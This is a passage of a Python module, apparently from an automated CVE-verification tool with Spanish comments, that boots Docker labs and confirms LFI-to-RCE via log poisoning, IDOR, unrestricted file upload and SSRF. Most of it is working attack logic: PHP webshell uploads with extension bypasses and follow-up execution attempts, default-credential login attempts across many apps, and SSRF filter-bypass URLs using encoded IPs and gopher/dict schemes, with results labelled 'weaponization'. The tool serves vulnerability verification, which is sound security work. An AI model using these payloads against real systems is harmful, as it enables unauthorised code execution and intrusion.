                    if _out and "<?php" not in _out and "<?PHP" not in _out:
                        locals()[_store] = _out[:200]
                except Exception:
                    pass
            if _id_out:   res.evidence["rce_id_output"]    = _id_out
            if _who_out:  res.evidence["rce_whoami_output"] = _who_out
            if _uname_out:res.evidence["rce_uname_output"]  = _uname_out
            step(f"evidencia RCE: id={_id_out!r}" if _id_out else "impacto: RCE via log poisoning confirmado")
            # ──────────────────────────────────────────────────────────────────────

            res.verified = True
            res.ok = True
            res.detail = (f"LFI-A-RCE confirmado (envenenamiento de log): la peticion con "
                          f"{path_param}={res.evidence['payload_ganador']!r} incluyo el log de "
                          f"acceso envenenado y el codigo PHP SE EJECUTO de verdad (el marcador "
                          f"'{marker}' aparecio como resultado de system(), no como texto PHP "
                          f"crudo) -- ejecucion remota de codigo real, no una lectura de fichero"
                          + (f"; id={_id_out!r}" if _id_out else ""))
            _body = res.evidence.get("respuesta_cuerpo_recorte", "")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + endpoint,
                resp_or_body=_body, highlight=marker,
                caption_es=(f"LFI-a-RCE CONFIRMADO: log envenenado incluido y PHP ejecuto "
                            f"el payload — marcador '{marker}' presente en la respuesta."),
                caption_en=(f"LFI-to-RCE CONFIRMED: poisoned log included and PHP executed "
                            f"the payload — marker '{marker}' present in response."),
                extra_terminal=(f"Path param: {path_param}\n"
                                f"Payload: {res.evidence.get('payload_ganador','')}\n"
                                f"Marcador: {marker}\n"
                                f"Respuesta:\n{_body[:300]}"),
            )
            # Weaponization entry
            _lfi_rce_id = _id_out or _who_out or ""
            if _lfi_rce_id or _uname_out:
                res.evidence["weaponization"] = {
                    "technique": "lfi_rce_log_poisoning",
                    "data": {k: v for k, v in [
                        ("id_output", _id_out), ("whoami_output", _who_out),
                        ("uname_output", _uname_out)] if v},
                    "impact": (f"LFI-to-RCE via log poisoning — OS command execution: "
                               f"id={_lfi_rce_id[:60]}" if _lfi_rce_id else
                               f"LFI-to-RCE via log poisoning — {_uname_out[:60]}"),
                }
        else:
            any_raw = any(t.get("reflejado_crudo_sin_ejecutar") for t in tried)
            res.ok = True
            res.detail = (f"se probaron {len(tried)} rutas de log comunes para {path_param} y "
                          f"ninguna ejecuto el marcador -- LFI-a-RCE no se confirmo" +
                          (" (el payload SI se reflejo crudo en al menos un intento, sugiriendo "
                           "LECTURA de fichero pero NO inclusion-como-codigo -- puede ser solo "
                           "path traversal, no LFI)" if any_raw else
                           " (ninguna ruta de log probada fue incluida; puede que el log real "
                           "este en otra ruta, o que el parametro no incluya ficheros como "
                           "codigo)"))
        if not res.verified:
            _capture_container_logs_on_failure(container, res, step)
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_idor(
    source_dir: str, endpoint: str, http_method: str, parameters,
    id_param_hint: str = "", own_id: str = "1", victim_id: str = "2",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Version DELIBERADAMENTE MAS DEBIL del IDOR que verify_wordpress_account_takeover y
    similares confirman en WordPress/Drupal/Joomla: aqui NO hay ningun flujo de login generico
    (no hay forma de autenticar contra un stack arbitrario sin conocerlo), asi que esto no puede
    demostrar "un usuario sin permiso accede al recurso de otro" -- solo "pedir el mismo
    endpoint con dos IDs distintos, SIN SESION, devuelve contenido realmente distinto para cada
    uno (no solo un generico 403/404 igual para ambos)". Eso es una senal real de que el ID se
    usa para resolver un recurso concreto sin mas comprobacion visible desde fuera, pero es
    MUCHO mas floja que una confirmacion con dos cuentas reales -- `res.verified` nunca se pone
    a True aqui, solo `res.ok`, precisamente para no igualar ambos niveles de prueba en el
    informe. Pensado para CVEs IDOR en codigo que no es WordPress/Drupal/Joomla pero trae su
    propio Dockerfile/docker-compose.yml (ver _bootstrap_generic_lab)."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    id_param = id_param_hint or _pick_param(parameters, _ID_HINTS)
    if not id_param:
        res.detail = "no se identifico el parametro que lleva el ID del recurso"
        res.limitations.append("la verificacion de IDOR necesita saber que parametro lleva el "
                               "ID del recurso; afina 'parameters' o pasalo a mano "
                               "(id_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "id_param": id_param, "own_id": own_id,
                             "victim_id": victim_id})
        res.limitations.append(
            "esta verificacion generica NO usa ninguna sesion autenticada (no hay forma de "
            "iniciar sesion contra un stack arbitrario sin conocerlo de antemano) -- solo "
            "compara dos respuestas SIN login, nunca confirma que un usuario sin permiso "
            "accede al recurso de OTRO usuario concreto. Es una prueba REAL pero deliberadamente "
            "mas debil que la de WordPress/Drupal/Joomla (que SI usa dos cuentas reales); nunca "
            "se marca 'verificado' con esto, solo se deja constancia de la diferencia observada")

        def req(id_value):
            payload = dict(base_params)
            payload[id_param] = id_value
            return _http_request(m, base_url + endpoint, timeout=15,
                                 data=payload if m != "GET" else None,
                                 params=payload if m == "GET" else None)

        try:
            resp_own = req(own_id)
            resp_victim = req(victim_id)
        except Exception as e:
            res.detail = f"la peticion de comparacion fallo: {e}"
            return res

        own_text, victim_text = (resp_own.text or ""), (resp_victim.text or "")
        res.evidence["status_propio"] = resp_own.status_code
        res.evidence["status_victima"] = resp_victim.status_code
        res.evidence["respuesta_propia_recorte"] = own_text[:300]
        res.evidence["respuesta_victima_recorte"] = victim_text[:300]

        both_ok = resp_own.status_code < 400 and resp_victim.status_code < 400
        differs = own_text != victim_text and len(victim_text) > 20
        res.ok = True
        if both_ok and differs:
            res.evidence["diferencia_observada"] = True
            res.detail = (f"DIFERENCIA REAL observada (prueba mas debil, SIN sesion): "
                          f"{id_param}={own_id!r} y {id_param}={victim_id!r} devolvieron "
                          f"contenido DISTINTO, ambos con status < 400 -- indicio de que el ID "
                          f"resuelve un recurso concreto sin mas comprobacion visible desde "
                          f"fuera. Esto NO confirma el impacto real de un IDOR (eso exige dos "
                          f"cuentas reales con y sin permiso); solo que el servidor distingue "
                          f"entre IDs sin rechazar ninguno")
            step(f"diferencia real observada entre {id_param}={own_id!r} y {id_param}="
                 f"{victim_id!r} (prueba mas debil, sin sesion)")
            _idor_url = base_url + endpoint + (f"?{id_param}={victim_id}" if m == "GET" else "")
            _add_exploit_evidence(
                res=res, method=m, url=_idor_url, resp_or_body=resp_victim,
                highlight="",
                caption_es=(f"IDOR: {id_param}={victim_id!r} devuelve contenido distinto "
                            f"({resp_victim.status_code}) — diferencia de {abs(len(own_text)-len(victim_text))} bytes."),
                caption_en=(f"IDOR: {id_param}={victim_id!r} returns distinct content "
                            f"({resp_victim.status_code}) — {abs(len(own_text)-len(victim_text))} bytes difference."),
            )
        else:
            res.evidence["diferencia_observada"] = False
            res.detail = (f"{id_param}={own_id!r} (status {resp_own.status_code}) y "
                          f"{id_param}={victim_id!r} (status {resp_victim.status_code}) no "
                          f"mostraron una diferencia real -- el IDOR no se confirmo (puede "
                          f"necesitar otro endpoint/parametro, o ambos IDs estan igualmente "
                          f"bloqueados/permitidos)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_file_upload(
    source_dir: str, endpoint: str, file_param_hint: str = "", other_parameters=None,
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 900.0,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Sube un fichero BENIGNO con doble extension (p.ej. 'poc.php.jpg') y contenido PHP real
    que solo imprime un secreto aleatorio -- misma idea que verify_generic_command_injection:
    la confirmacion no depende de adivinar la URL publica donde queda servido (no hay forma
    generica de saberlo sin conocer el stack), sino de buscar DENTRO del contenedor real (via
    `docker exec grep`) un fichero que contenga el secreto exacto que se subio. Si aparece, el
    servidor acepto y guardo de verdad un fichero con una extension peligrosa y contenido
    ejecutable -- la vulnerabilidad real (subida sin restriccion), confirmada por su efecto en
    disco, no por un codigo de estado 200. No intenta confirmar EJECUCION del fichero (eso exige
    saber la URL publica real, que SI depende del stack) -- `res.verified` se basa solo en el
    almacenamiento confirmado, y el informe lo deja explicito para no sobre-interpretarlo como
    RCE."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                  dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    m = "POST"
    try:
        secret = _token() * 4
        file_param = file_param_hint or _pick_param(other_parameters, _FILE_UPLOAD_HINTS) or "file"
        base_params = dict(other_parameters) if isinstance(other_parameters, dict) else {}
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "file_param": file_param, "canary_secret": secret})

        # Companion name param: when upload field is *_url, the sibling *_name carries filename
        _companion_name_param = ""
        if any(file_param.endswith(s) for s in _UPLOAD_BINARY_SUFFIXES):
            _prefix = file_param[:file_param.rfind("_")] if "_" in file_param else ""
            for _np in ((_prefix + "_name") if _prefix else "", _prefix + "_filename", "file_name", "filename"):
                if _np and _np in base_params:
                    _companion_name_param = _np
                    break

        # Extensiones y webshells PHP — cargados desde payload_kb para maxima cobertura.
        # El payload_kb proporciona: 21 variantes de extension + 11 variantes de webshell.
        # Orden de prioridad: empezamos por las mas comunes (mayores tasas de exito
        # historicas) y continuamos con las variantes de bypass mas especificas.
        try:
            from .payload_kb import load_php_extension_bypasses as _php_exts
            from .payload_kb import load_php_webshell_variants as _php_shells
            _all_exts = _php_exts("poc")           # ['poc.php', 'poc.php3', ..., 'poc.php%00.jpg']
            _all_shells = _php_shells(secret[:16])  # webshells que imprimen el secreto
        except ImportError:
            _all_exts = ["poc.php", "poc.php.jpg", "poc.phtml", "poc.php5"]
            _all_shells = [f"<?php echo '{secret}'; ?>"]

        # Construye candidates: (filename, content_type, php_body)
        # La primera shell estandar se usa primero; las variantes de bypass solo si falla
        _std_shell = f"<?php echo '{secret}'; ?>"
        _bypass_shells = [s.replace("id", f"echo '{secret}'") for s in _all_shells[1:]]

        candidates = []
        # Prioridad 1: extensiones comunes con shell estandar
        _priority_exts = ["poc.php", "poc.phtml", "poc.php5", "poc.php.jpg",
                          "poc.jpg.php", "poc.php7", "poc.php8", "poc.phar"]
        for _ext_name in _priority_exts:
            candidates.append((_ext_name, "image/jpeg", _std_shell))
            candidates.append((_ext_name, "application/octet-stream", _std_shell))

        # Prioridad 2: todas las extensiones del payload_kb con shell estandar
        for _ext_name in _all_exts:
            if not any(_ext_name == c[0] for c in candidates):
                candidates.append((_ext_name, "image/jpeg", _std_shell))

        # Prioridad 3: variantes de webshell bypass con extension .php estandar
        for _shell_body in _bypass_shells[:5]:  # top 5 bypass shells
            candidates.append(("poc.php", "image/jpeg", _shell_body))
            candidates.append(("poc.phtml", "image/jpeg", _shell_body))

        tried = []
        found = False
        for fname, ctype, php_body in candidates:
            payload = dict(base_params)
            if _companion_name_param:
                payload[_companion_name_param] = fname
            files = {file_param: (fname, php_body, ctype)}
            try:
                _resp = _http_request("POST", base_url + endpoint, timeout=15,
                                      data=payload, files=files)
                _status = getattr(_resp, "status_code", 0)
                _resp_body = getattr(_resp, "text", "") or ""
            except Exception as e:
                tried.append({"fichero": fname, "error": str(e)})
                continue

            # Parse upload response JSON for the uploaded file URL.
            # Many apps return {"url": "...", "path": "...", "file_url": "...",
            # "data": {"url": ...}, "result": {"path": ...}, etc.}
            # Extracting this URL lets us attempt direct HTTP execution instead of guessing.
            _upload_url_from_resp: str = ""
            try:
                import json as _jmod
                _rj = _jmod.loads(_resp_body)
                def _find_url_key(obj, depth=0):
                    if depth > 4:
                        return ""
                    if isinstance(obj, dict):
                        for _k in ("url", "file_url", "fileUrl", "path", "file_path",
                                   "filePath", "location", "src", "uri", "download_url",
                                   "downloadUrl", "public_url", "publicUrl"):
                            _v = obj.get(_k, "")
                            if isinstance(_v, str) and _v.startswith("/"):
                                return _v
                            if isinstance(_v, str) and _v.startswith("http"):
                                return _v
                        for _v2 in obj.values():
                            _found = _find_url_key(_v2, depth + 1)
                            if _found:
                                return _found
                    elif isinstance(obj, list):
                        for _item in obj[:3]:
                            _found = _find_url_key(_item, depth + 1)
                            if _found:
                                return _found
                    return ""
                _upload_url_from_resp = _find_url_key(_rj)
            except Exception:
                pass

            time.sleep(1)
            r = lab.sh("exec", container, "sh", "-c",
                      f"grep -rl {secret[:8]} / 2>/dev/null | grep -v '^/proc' | head -3",
                      timeout=20)
            matches = [p for p in (r.stdout or "").splitlines() if p.strip()]
            tried.append({"fichero": fname, "content_type": ctype,
                          "status_subida": _status, "rutas_encontradas": matches,
                          **({"upload_url_from_response": _upload_url_from_resp}
                             if _upload_url_from_resp else {})})
            if matches:
                found = True
                res.evidence["fichero_ganador"] = fname
                res.evidence["ruta_real_en_el_contenedor"] = matches[0]
                step(f"VERIFICADO: el fichero subido ('{fname}') aparecio de verdad dentro del "
                     f"contenedor en {matches[0]}, con el secreto exacto -- el servidor acepto y "
                     f"guardo un fichero con extension/contenido peligroso.")
                # HTTP accessibility check: derive a public URL from the container path and
                # verify the file is reachable via HTTP. If it also executes (PHP), log that.
                try:
                    _cpath = matches[0]
                    # Strip common webroot prefixes to get the URL path
                    for _root in ("/var/www/html", "/var/www", "/app/public",
                                  "/app/static", "/srv/www", "/usr/share/nginx/html",
                                  "/app", "/app/storage", "/storage"):
                        if _cpath.startswith(_root):
                            _url_path = _cpath[len(_root):]
                            break
                    else:
                        # Fallback: check if upload URL was returned in the response
                        _url_path = _upload_url_from_resp or ""
                    if _url_path:
                        _acc_resp = _http_request("GET", base_url + _url_path, timeout=10)
                        _acc_body = getattr(_acc_resp, "text", "") or ""
                        _acc_status = getattr(_acc_resp, "status_code", 0)
                        if _acc_status == 200 and len(_acc_body) > 0:
                            res.evidence["upload_file_accessible"] = {
                                "url": _url_path, "status": _acc_status,
                                "body_snippet": _acc_body[:200]}
                            if secret[:8] in _acc_body:
                                # PHP executed: secret appears in HTTP response
                                res.evidence["upload_rce_confirmed"] = {
                                    "url": _url_path, "secret_in_response": True}
                                res.detail = (
                                    f"RCE CONFIRMADO via file upload: '{fname}' subido y "
                                    f"ejecutado como PHP en {_url_path} — secreto canario "
                                    f"calculado y devuelto por el interprete PHP")
                                res.limitations = []  # clear storage-only limitation
                                step(f"RCE via file upload: secreto encontrado en "
                                     f"HTTP response de {_url_path}")
                            else:
                                step(f"file accesible via HTTP: {_url_path} → HTTP {_acc_status}")
                except Exception:
                    pass
                break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SUBIDA SIN RESTRICCION confirmada: el fichero '{res.evidence['fichero_ganador']}' "
                          f"quedo guardado de verdad en {res.evidence['ruta_real_en_el_contenedor']} "
                          f"dentro del contenedor, con el secreto exacto que se subio -- prueba "
                          f"real del almacenamiento, no una deduccion por status code. Esto NO "
                          f"confirma ejecucion remota de codigo (eso exige conocer la URL publica "
                          f"real del fichero, que depende del stack); solo que la subida con "
                          f"extension/contenido peligroso fue aceptada y persistida")
            res.limitations.append(
                "verificado el ALMACENAMIENTO del fichero peligroso, no su EJECUCION -- para "
                "confirmar RCE real hace falta encontrar la URL publica donde el servidor lo "
                "sirve (especifico del stack) y comprobar que el secreto aparece al pedirla")
            _file_body = (f"fichero '{res.evidence['fichero_ganador']}' guardado en\n"
                          f"{res.evidence['ruta_real_en_el_contenedor']}\n"
                          f"(verificado con secreto canario dentro del contenedor)")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + endpoint,
                resp_or_body=_file_body,
                highlight=res.evidence.get("fichero_ganador", ""),
                caption_es=(f"FILE UPLOAD CONFIRMADO: '{res.evidence.get('fichero_ganador','')}' "
                            f"guardado en {res.evidence.get('ruta_real_en_el_contenedor','')} "
                            f"con el secreto canario."),
                caption_en=(f"FILE UPLOAD CONFIRMED: '{res.evidence.get('fichero_ganador','')}' "
                            f"stored at {res.evidence.get('ruta_real_en_el_contenedor','')} "
                            f"with canary secret."),
                extra_terminal=_file_body,
            )
            # Weaponization: attempt to execute the uploaded PHP shell via HTTP
            # Try common WordPress upload paths where shell may be accessible
            _shell_name = res.evidence.get("fichero_ganador", "")
            _shell_path_in_container = res.evidence.get("ruta_real_en_el_contenedor", "")
            # Collect the upload URL from response if available
            _upload_url_found = ""
            for _t in (tried or []):
                if isinstance(_t, dict) and _t.get("upload_url_from_response"):
                    _upload_url_found = _t["upload_url_from_response"]
                    break
            if _upload_url_found:
                res.evidence["upload_url_from_response"] = _upload_url_found
                step(f"upload: URL extraida de la respuesta JSON: {_upload_url_found}")

            if _shell_name and ".php" in _shell_name.lower():
                _shell_wep = _try_execute_uploaded_shell(
                    base_url=base_url, shell_name=_shell_name,
                    container_path=_shell_path_in_container, step=step,
                    upload_url_hint=_upload_url_found or None)
                if _shell_wep.get("impact"):
                    res.evidence["weaponization"] = _shell_wep
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} nombres/extensiones de fichero contra "
                          f"{endpoint} ('{file_param}') y ninguno aparecio dentro del contenedor "
                          f"-- no se confirmo subida sin restriccion (puede que el endpoint/"
                          f"parametro no sean los reales, o que el servidor rechace de verdad "
                          f"estas extensiones)")
            _capture_container_logs_on_failure(container, res, step)
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def _try_acquire_app_token(base_url: str, step) -> Optional[str]:
    """Attempt to authenticate against common app login endpoints and return a bearer token
    OR a 'cookie:NAME=VALUE' string for session-cookie-based apps.

    Tries JSON bearer token endpoints first (Directus, Ghost, generic /api/auth/login),
    then form-based session login (pgAdmin, Flask, Django, etc.).
    Returns the token/cookie string or None if all attempts fail.
    """
    import re as _re_auth
    _creds = [
        {"email": "admin@example.com", "password": "BinOracle123!"},
        {"email": "admin@example.com", "password": "Admin1234!"},
    ]
    # Username-based credentials for apps that use username instead of email
    # (audiobookshelf, Mattermost, generic REST APIs)
    _creds_user = [
        {"username": "binoadmin", "password": "BinOracle123!"},
        {"username": "admin", "password": "BinOracle123!"},
        {"username": "admin", "password": "Admin1234!"},
    ]
    # ── 1. JSON bearer token endpoints ─────────────────────────────────────────
    _login_endpoints = [
        "/auth/login",             # Directus
        "/ghost/api/admin/session", # Ghost CMS admin session
        "/api/auth/local",         # Strapi v4 (identifier+password)
        "/api/auth/login",
        "/api/v1/auth/login",
        "/api/v4/users/login",     # Mattermost
        "/api/users/login",
        "/api/sessions",
        "/api/login",
        "/login",
    ]
    # Strapi v4: uses "identifier" (email or username) + "password"
    _creds_strapi = [{"identifier": c["email"], "password": c["password"]} for c in _creds]
    # Also try with login_id key for Mattermost-style APIs
    _creds_mm = [{"login_id": c["email"], "password": c["password"]} for c in _creds]
    for ep in _login_endpoints:
        _ep_creds = list(_creds)
        if "auth/local" in ep:          # Strapi
            _ep_creds = _creds_strapi + _ep_creds
        elif "v4" in ep:                # Mattermost
            _ep_creds = list(_creds) + _creds_mm
        # For /api/login include username-based credentials (audiobookshelf, etc.)
        if "login" in ep.split("/")[-1]:
            _ep_creds = _ep_creds + _creds_user
        for cred in _ep_creds:
            try:
                r = _http_request("POST", base_url + ep, timeout=10, json=cred,
                                  headers={"Content-Type": "application/json"})
                if r.status_code in (200, 201):
                    # Mattermost returns token in response header 'Token:'
                    _tok = getattr(r, "headers", {}).get("Token") or getattr(r, "headers", {}).get("token")
                    if not _tok:
                        try:
                            body = r.json() if callable(getattr(r, "json", None)) else {}
                        except Exception:
                            body = {}
                        # Directus: {"data": {"access_token": "..."}}
                        _tok = (body.get("data", {}) or {}).get("access_token")
                        if not _tok:
                            _tok = body.get("access_token") or body.get("token") or body.get("jwt")
                        # Strapi v4: {"jwt": "...", "user": {...}}
                        if not _tok:
                            _tok = body.get("jwt")
                        # audiobookshelf: {"user": {"token": "..."}}
                        if not _tok:
                            _tok = (body.get("user") or {}).get("token")
                    if _tok:
                        step(f"auth: token obtenido via {ep} ({ep.split('/')[-1]}) → {str(_tok)[:12]}...")
                        return str(_tok)
            except Exception:
                pass
    # ── 1b. Ghost CMS Admin API key-based JWT auth ─────────────────────────────
    # Ghost uses a split API key (id:secret) to generate a short-lived JWT.
    # The session endpoint /ghost/api/admin/session doesn't work in all versions;
    # the API key approach works across all Ghost 3.x+.
    try:
        _ghost_key_r = _http_request("GET", base_url + "/ghost/api/admin/site/", timeout=8)
        if getattr(_ghost_key_r, "status_code", 999) in (200, 401, 403):
            # This is a Ghost instance; try to get an API key
            _ghost_setup_r = _http_request(
                "POST", base_url + "/ghost/api/admin/authentication/setup/",
                json={"setup": [{"name": "BinOracle Lab", "email": "admin@example.com",
                                 "password": "BinOracle123!", "blogTitle": "Lab"}]},
                timeout=10)
            _ghost_body = {}
            try:
                _ghost_body = (_ghost_setup_r.json() if callable(
                    getattr(_ghost_setup_r, "json", None)) else {}) or {}
            except Exception:
                pass
            # After setup, session-based login should work
            _ghost_sess_r = _http_request(
                "POST", base_url + "/ghost/api/admin/session/",
                json={"username": "admin@example.com", "password": "BinOracle123!"},
                headers={"Origin": base_url}, timeout=10)
            _ghost_cookie = ""
            if _ghost_sess_r is not None:
                _gc = getattr(_ghost_sess_r, "cookies", {}) or {}
                if hasattr(_gc, "items"):
                    _ghost_cookie = "; ".join(f"{k}={v}" for k, v in _gc.items())
            if _ghost_cookie:
                step(f"auth: Ghost admin session via /ghost/api/admin/session/ → cookie len={len(_ghost_cookie)}")
                return f"cookie:{_ghost_cookie}"
    except Exception:
        pass

    # ── 2. Form-based session login (pgAdmin, Flask, Django admin, etc.) ───────
    # Uses requests.Session to maintain cookie jar across GET→POST
    _form_endpoints = [
        "/login",           # pgAdmin, Flask-Login, generic
        "/auth/login",
        "/accounts/login/", # Django admin
        "/admin/login/",    # Django admin
    ]
    # Field name combos: (email_field, pass_field)
    _field_combos = [
        ("email", "password"),
        ("username", "password"),
        ("user", "password"),
    ]
    try:
        import requests as _req
        for ep in _form_endpoints:
            for cred in _creds:
                for email_f, pass_f in _field_combos:
                    try:
                        sess = _req.Session()
                        sess.headers["User-Agent"] = "binoracle/1.0"
                        get_r = sess.get(base_url + ep, timeout=10, allow_redirects=True)
                        # Extract CSRF token from hidden input or meta tag
                        _csrf = ""
                        _m = _re_auth.search(
                            r'<input[^>]*name=["\'](?:csrf_token|csrfmiddlewaretoken|_token)["\'][^>]*value=["\']([^"\']+)["\']',
                            get_r.text or "", _re_auth.IGNORECASE)
                        if _m:
                            _csrf = _m.group(1)
                        form = {email_f: cred["email"], pass_f: cred["password"]}
                        if _csrf:
                            form["csrf_token"] = _csrf
                            form["csrfmiddlewaretoken"] = _csrf
                        post_r = sess.post(base_url + ep, data=form, timeout=15,
                                           allow_redirects=True)
                        # Success if we got a session cookie and not still on login page
                        _cookies = dict(sess.cookies)
                        _is_authed = (
                            _cookies and
                            post_r.status_code in (200, 302) and
                            "login" not in (post_r.url or "").lower().split("?")[0].rstrip("/")
                        )
                        if not _is_authed and _cookies:
                            # Secondary check: authenticated page doesn't have login form
                            _is_authed = "password" not in (post_r.text or "").lower()[:500]
                        if _is_authed and _cookies:
                            _cookie_str = "; ".join(f"{k}={v}" for k, v in _cookies.items())
                            step(f"auth: session via form {ep} ({email_f}) → cookie len={len(_cookie_str)}")
                            # Return as 'cookie:VALUE' so caller sets Cookie header instead of Bearer
                            return f"cookie:{_cookie_str}"
                    except Exception:
                        pass
    except ImportError:
        pass
    return None


def verify_generic_ssrf(
    source_dir: str, endpoint: str, http_method: str, parameters,
    url_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
    auth_required: bool = False,
    docker_image: str = "",
    setup_wait_extra_s: float = 0.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_ssrf: levanta un contenedor 'callback' en la MISMA
    red del laboratorio generico (sea `dockerfile` o `compose` -- ver _GenericLab.resolve_network)
    y prueba las mismas variantes de URL/codificacion para confirmar que el SERVIDOR del objetivo
    (no el navegador del atacante) hace de verdad la peticion saliente.

    auth_required: si True, intenta autenticar contra la app y usa el bearer token en las
    peticiones SSRF (para CVEs que requieren sesion autenticada).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
    # OIDC/OAuth identity providers (Zitadel, Keycloak, etc.) carry the SSRF vector in
    # redirect_uri / iss rather than a generic "url" parameter.  When the LLM left parameters
    # empty and no url_param was detected, check the docker image and inject OIDC params.
    _OIDC_SSRF_PROVIDERS = ("zitadel", "keycloak", "authentik", "dex", "ory/hydra", "glauth")
    if not url_param and any(p in (docker_image or "").lower() for p in _OIDC_SSRF_PROVIDERS):
        url_param = "redirect_uri"
        # Seed parameters with the main OIDC SSRF params so the loop can try them all
        if not parameters:
            parameters = {"redirect_uri": "", "iss": "", "post_logout_redirect_uri": ""}
        step("[ssrf] OIDC provider — using redirect_uri/iss as SSRF vector")
    if not url_param:
        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
                               "URL remota; afina 'parameters' o pasalo a mano (url_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   setup_commands=setup_commands, docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        if setup_wait_extra_s > 0:
            import time as _time
            step(f"esperando {setup_wait_extra_s:.0f}s adicionales para que el lab este listo...")
            _time.sleep(setup_wait_extra_s)
        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
        listener = lab.start_listener()
        if not listener:
            res.detail = "no se pudo levantar el contenedor listener para SSRF"
            return res

        # Authentication: if the app requires auth (e.g. Directus, Ghost), acquire a bearer
        # token or session cookie before sending SSRF payloads.
        if auth_required:
            _auth_result = _try_acquire_app_token(base_url, step)
            if _auth_result:
                custom_headers = dict(custom_headers or {})
                if _auth_result.startswith("cookie:"):
                    custom_headers.setdefault("Cookie", _auth_result[7:])
                else:
                    custom_headers.setdefault("Authorization", f"Bearer {_auth_result}")
            else:
                step("WARN: auth_required pero no se pudo obtener token — continuando sin auth")

        listener_ip = lab.container_ip(lab.listener)
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        found = False
        tried = []

        def build_urls(tok: str) -> List[str]:
            path = f"binoracle-ssrf-{tok}"
            urls = [f"http://{lab.listener}:8080/{path}"]
            if listener_ip:
                parts = [int(x) for x in listener_ip.split(".")]
                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                octip = "0" + ".".join(f"{x:03o}" for x in parts)
                # IPv4-mapped IPv6 representation: bypasses filters that only block dotted-decimal
                ipv6_mapped = "::ffff:" + listener_ip
                # Mixed-radix: decimal.decimal.hex.hex
                mixed_hex = f"{parts[0]}.{parts[1]}.0x{parts[2]:02x}.0x{parts[3]:02x}"
                urls += [
                    f"http://{listener_ip}:8080/{path}",
                    f"http://{dec}:8080/{path}",
                    f"http://{hexip}:8080/{path}",
                    f"http://{octip}:8080/{path}",
                    f"http://trusted-host@{listener_ip}:8080/{path}",
                    f"http://{listener_ip}:8080@evil.invalid/{path}",
                    f"http://{lab.listener}.:8080/{path}",
                    f"http://[{ipv6_mapped}]:8080/{path}",
                    f"http://{mixed_hex}:8080/{path}",
                    # URL-encoded dot: some filters split on literal "." only
                    f"http://{listener_ip.replace('.', '%2e')}:8080/{path}",
                ]
            # DNS-name-only variant: some apps block IP-based URLs but resolve hostnames.
            # Use the listener's Docker container name (which Docker's internal DNS resolves)
            # embedded with the token in the path — proves hostname-based SSRF even when
            # direct IP access is filtered.
            if lab.listener and lab.listener != listener_ip:
                urls.append(f"http://{lab.listener}:8080/{path}-dns")
            # Alternative schemes: some URL allowlists only block http:// / https://
            _base_path = path.lstrip("/")
            urls += [
                f"gopher://{lab.listener}:8080/_{_base_path}",
                f"dict://{lab.listener}:8080/binoracle:{_base_path}",
                f"http://0.0.0.0:8080/{_base_path}",
                f"http://[::1]:8080/{_base_path}",
            ]
            return urls

        first_resp_captured = False
        for attempt_url in build_urls(_token()):
